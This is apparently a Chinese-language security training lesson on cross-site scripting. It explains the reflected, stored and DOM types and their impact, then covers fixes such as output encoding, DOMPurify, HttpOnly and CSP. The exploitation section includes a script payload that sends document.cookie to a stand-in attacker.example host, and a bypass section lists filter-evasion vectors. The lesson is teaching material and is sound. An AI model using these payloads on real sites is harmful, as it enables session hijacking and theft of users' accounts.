# C02-02 · XSS 跨站脚本

## 学习目标

- 分清反射型 / 存储型 / DOM 型
- 会构造与验证 PoC，理解危害边界
- 掌握输出编码、CSP、HttpOnly 等修复组合拳

## 一、原理

应用把**不可信数据**当 HTML/JS 插入页面，浏览器执行了攻击者脚本。

```text
攻击者输入 <script>…</script> / 事件属性
  → 服务器或前端写入 DOM
  → 浏览器解析为可执行内容
  → 脚本在受害用户会话中运行
```

## 二、三种类型

| 类型 | 存储位置 | 触发 | 例子 |
|------|----------|------|------|
| 反射型 | URL/参数，不落库 | 诱导点击链接 | 搜索框回显 |
| 存储型 | 数据库/文件 | 多人访问触发 | 留言、昵称、评论 |
| DOM 型 | 前端处理逻辑 | 前端 sink | `innerHTML = location.hash` |

**存储型通常危害更大**（蠕虫、持久后门）；**DOM 型**是前端主战场。

## 三、利用与危害（靶场合法环境）

| 目的 | 手段示例 |
|------|----------|
| 窃取 Cookie | `document.cookie`（若有 HttpOnly 则失效） |
| 会话劫持 | 带 Cookie 请求攻击者服务器 |
| 钓鱼 | 改 DOM 伪造登录框 |
| 钓鱼蠕虫 | 自动发留言传播 |
| 按钮劫持 | 诱导调用转账 API |
| 配合 CSRF | 在用户上下文发起敏感请求 |

```html
<script>new Image().src='https://attacker.example/c?'+document.cookie</script>
<img src=x onerror="/* … */">
```

> 只在靶场使用；对真实未授权站点使用即违法。

## 四、绕过与过滤（原理向）

- 标签/事件多样性：`<img onerror>`、`<svg onload>`、`<details ontoggle>`
- 大小写、嵌套、注释 `"><svg/onload=…>`
- HTML 实体、URL 编码、Unicode
- JavaScript URL：`javascript:alert(1)`
- **不要只做黑名单**；优先编码/白名单/CSP

## 五、修复

### 1. 输出编码（核心）

| 上下文 | 做法 |
|--------|------|
| HTML 文本 | 实体编码 `< > & " '` |
| HTML 属性 | 属性编码，避免拼接 |
| JS | JSON 编码后输出，禁止拼接进 script |
| URL | 合法协议白名单 |
| CSS | 避免用户输入进 style |

前端：
```javascript
// 避免
el.innerHTML = userData
// 优先
el.textContent = userData
```

### 2. 输入校验
富文本用成熟净化库（DOMPurify 等）+ 白名单标签/属性。

### 3. 浏览器策略
- `HttpOnly` Cookie
- CSP（`script-src` 收紧、nonce）
- `X-XSS-Protection` 已过时，不要依赖

### 4. 服务端
- 框架默认转义（React 文本节点、Vue 插值）保持开启
- 禁用 `dangerouslySetInnerHTML` 直接插用户数据
